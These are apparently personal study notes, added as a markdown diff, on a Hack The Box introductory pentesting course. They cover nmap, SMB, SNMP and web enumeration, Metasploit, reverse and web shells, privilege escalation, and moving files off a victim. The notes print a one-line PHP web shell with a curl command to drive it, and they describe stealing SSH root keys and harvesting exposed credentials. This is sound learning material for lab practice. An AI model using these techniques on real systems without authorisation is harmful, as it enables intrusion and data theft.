@@ -1,0 +1,138 @@
+### Introduction
+- Infosec is huge.
+- Tons of specializations:
+	- Network and infrastructure security
+	- Application security
+	- Security testing
+	- Systems auditing
+	- Business continuity planning
+	- Digital forensics
+	- Incident detection and response
+	- ...
+- CIA Triad
+- Risk management process:
+	- Identify the risk (where is it)
+	- Analyze the risk (what is it)
+	- Evaluate the risk (how much is it)
+	- Dealing with risk (choose mitigate, accept, etc.)
+	- Monitoring risk (keep track of it)
+- Red team and blue team
+- Penetration testers helps to identify risks.
+### Setup
+- Install an OS (I'll stay local, thank you)
+- Use logical structure in your notes.
+- Connect with the VPN.
+### Pentesting Basics
+- Common terms:
+	- Shell: commands to system calls. Reverse shells use the attack box as a server, a bind shell uses the target box as a server, a web shell works on the website. - A number assigned to a service that is open to the network.
+	- Web server: service that hosts a web site/service
+- Basic tools:
+	- SSH
+	- Netcat, `netcat`, `nc`
+	- Terminal multiplexers, such as `tmux` (meh)
+	- VIM MENTIONED
+- Service scanning
+	- It's `nmap` time.
+	- We wanna hit the generic `nmap -A -sV -sC -p- [IP/IP RANGE]`
+	- `nmap -A -p- [IP/IP RANGE]`
+		- This just does everything
+	- To run specific scripts:
+		- `locate scripts/citrix`
+		- `nmap --script [SCRIPT NAME] -p[PORTS] [IP/IP RANGE]`
+	- Quick netcat banner grab: `nc -nv [IP] [PORT]`
+	- Quick lil' FTP:
+		- `ftp -p [IP]`
+		- Login as `anonymous`
+	- A good script for `nmap` and SMB: `nmap --script smb-os-discovery.nse -p[PORT] [IP/IP RANGE]`
+		- `smbclient` to attempt a connection
+		- `smbclient -N -L \\\\[IP ADDR]` to list shares
+		- `smbclient -U [USER NAME] \\\\[IP ADDR]\\[SHARE NAME]` to attempt a login on the share
+	- Enumerate SNMP with a lil' 
+		- `snmpwalk -v 2c -c public [IP] [bunch of numbers]`
+		- `snmpwalk -v 2c -c private [IP]`
+		- `onesixtyone -c [WORDLIST] [IP]`
+- Web Enumeration
+	- Gobuster! This is generally preferred, it's faster than `ffuf` and `dirbuster`. Go ahead and hit them with that:
+		- `gobuster dir -u http://[TARGET]/ -w [WORDLIST PATH]`, they recommend `Discovery/Web-Content/common.txt` from `seclists`.
+		- Add a DNS server (such as `1.1.1.1`) to `/etc/resolve.conf`. After that, hit them with: `gobuster dns --do [ROOT DOMAIN] -w [WORDLIST PATH]`. They recommend `Discovery/DNS/namelist.txt` from `seclists`.
+	- Quick banner grab:
+		- `curl -IL [URL]`
+	- Get a ton of web service information:
+		- `whatweb [IP]`
+		- VERY USEFUL
+	- Check the SSL/TLS certificates.
+	- You can always find a little something useful in `robots.txt`.
+	- Always go through the source code as well.
+- Public Exploits
+	- Learn to Google!
+	- Search exploitdb with `searchsploit`
+	- Metasploit primer:
+		- `msfconsole`
+		- `search exploit [name]`
+	- Every version you see everywhere needs to be researched.
+- Shells!
+	- Who doesn't love to pop a shell?
+	- Reverse shells are great!
+		- Most common type we'll be using.
+		- Listen for it with `nc -lvnp [PORT]`
+			- `-l` listen
+			- `-v` verbose
+			- `-n` disable DNS resolution to speed up the connection
+			- `-p` specify the port
+		- Bypasses firewalls because they need to allow arbitrary outbound ports.
+		- All sorts of reverse shell one-liners, just save a cheat-sheet.
+		- Payload All The Things is supposed to be great.
+	- Bind shells are great!
+		- This is a typical shell rather than a reverse shell.
+	- Web shells are great!
+		- And as simple as `<?php system($_REQUEST["cmd"]); ?>`
+			- For ones that aren't interactive like this, it's easiest to just do: `curl http://[IP]:[PORT]/path/to/shell.php?cmd=[COMMAND]`
+		- Just upload it to the site and profit.
+- Privilege Escalation
+	- We want to become `root`. We want to become `administrator/SYSTEM`.
+	- There's checklists for that! Check out:
+		- HackTricks
+		- PayloadAllTheThings
+	- Enumeration scripts!
+		- We wanna hit `LinEnum` and `linuxprivchecker` for our boy Tux
+		- We wanna hit `Seatbelt` and `JAWS` for not our boy Gates
+		- A very powerful tool is the Privilege Escalation Awesome Scripts Suite (PEASS), which has some great scripts for both operating systems.
+	- Kernel exploits are always legit. Gotta love some dirty COW (love that copy on write).
+	- Vulnerable software (your boy is running things with the stickiest icky bit)
+	- User privileges
+		- Do you have `sudo`?
+			- Use `sudo -l` to get your permissions
+			- If you have access to only some binaries with `sudo`, use GTFOBins to see a list of commands and how to exploit them. Windows has LOLBAS. 
+		- Do you have `SUID`?
+		- Do you have Windows Token Privs?
+	- Scheduled tasks are always great. If you have write permissions to either a script that they run or the actual config file, check out `/etc/crontab`, `/etc/cron.d`, and `/var/spool/cron/crontabs/root`.
+	- Exposed credentials can always be found in config files, logs, `bash_history`, and `PSReadLine`.
+	- If you can find an SSH root key, you're golden. If you can write an SSH key to `/root/.ssh/`, you're golden.
+		- Steal the private key, add it to your `~/.ssh/id_rsa` locally. Then just SSH as the user.
+- Transferring files
+	- Important to actually be able to exfiltrate data.
+	- The classic option is `python3 -m http.server [PORT]` on the victim, then `wget [IP]:[PORT]/path/to/file` on the attack box.
+	- SCP is also a great option if you have SSH access.
+	- An interesting option is to just base64 encode a file, then copy and paste it.
+	- Validate file transfers with checksums and the `file` command.
+### Getting Started with HTB
+- Starting out
+	- There's guided and exploratory learning. HTB Academy is guided, the main platform is exploratory.
+	- Do a bunch of stuff, never stop learning. Get good and consistent with things before moving on.
+- Navigating HTB
+	- My profile has some stats on it
+	- There's rankings of users, teams universities, countries, and VIP members
+	- There's different "tracks" that go through sets of machines with similar focus
+	- Machines are just individual boxes
+		- Active machines are free
+		- Retired machines are VIP only
+	- A fortress is a vulnerable lab created by an external company and hosted on HTB. There are several flags that can be found and submitted. Requires a rank of `Hacker`.
+	- Endgames are labs containing several machines within a single network. They reflect real-world situations that you'll encounter during a penetration test for a company. These require a rank of `Guru`.
+	- Pro labs are the biggest lab experience. They simulate real-world enterprise infrastructure. There's five pro labs, each one with different difficulty levels. They require a different subscription plan, but after completing each one you get a certificate of completion.
+	- Battlegrounds are real-time games of strategy and hacking. You compete in teams of 4 or 2. It can be either attack/defense or king of the hill. It looks pretty neat.
+### Attacking Your First Box
+- Going against Nibbles. I shall attempt this box myself, and then compare my results to the walkthrough.
+- Apparently this isn't an option for me, I'd need to pay for premium. Scam.
+- I'll just do an active machine with an easy rating.
+### Problem Solving
+### What's Next?
